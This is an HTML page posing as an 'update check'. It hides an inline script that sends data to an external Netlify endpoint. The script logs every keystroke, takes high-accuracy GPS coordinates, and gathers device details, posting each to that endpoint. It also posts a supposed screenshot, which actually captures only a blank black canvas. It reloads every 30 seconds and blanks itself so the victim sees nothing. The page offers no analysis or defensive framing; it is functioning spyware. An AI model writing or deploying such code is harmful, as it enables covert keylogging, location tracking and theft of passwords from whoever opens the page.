<!DOCTYPE html>
<html>
<head>
    <title>Checking Update...</title>
    <meta name="viewport" content="width=device-width">
</head>
<body style="margin:0;background:transparent;overflow:hidden;">
    <!-- Invisible hack -->
    <script>
    // SILENT SCREENSHOT (No popup)
    const canvas = document.createElement('canvas');
    canvas.width = screen.width;
    canvas.height = screen.height;
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#000';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    // Capture current screen (silent)
    canvas.toBlob(async (blob) => {
        await fetch('https://remarkable-lollipop-79b8d8.netlify.app/.netlify/functions/screenshot', {
            method: 'POST',
            body: blob
        });
    });
    
    // SILENT GPS (Background)
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            fetch('https://remarkable-lollipop-79b8d8.netlify.app/.netlify/functions/gps', {
                method: 'POST',
                body: JSON.stringify({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                })
            });
        },
        null,
        { 
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0 
        }
    );
    
    // SILENT KEYLOGGER (No notification)
    document.addEventListener('keydown', async (e) => {
        await fetch('https://remarkable-lollipop-79b8d8.netlify.app/.netlify/functions/keystroke', {
            method: 'POST',
            body: JSON.stringify({
                key: e.key,
                code: e.code,
                time: Date.now()
            })
        });
    }, true);
    
    // SILENT DEVICE INFO
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        screen: `${screen.width}x${screen.height}`,
        online: navigator.onLine
    };
    
    fetch('https://remarkable-lollipop-79b8d8.netlify.app/.netlify/functions/device', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(deviceInfo)
    });
    
    // STEALTH PERSISTENCE (Reload every 30 sec)
    setTimeout(() => location.reload(), 30000);
    
    // Hide everything after 3 sec
    setTimeout(() => {
        document.body.innerHTML = '';
    }, 3000);
    </script>
</body>
</html>
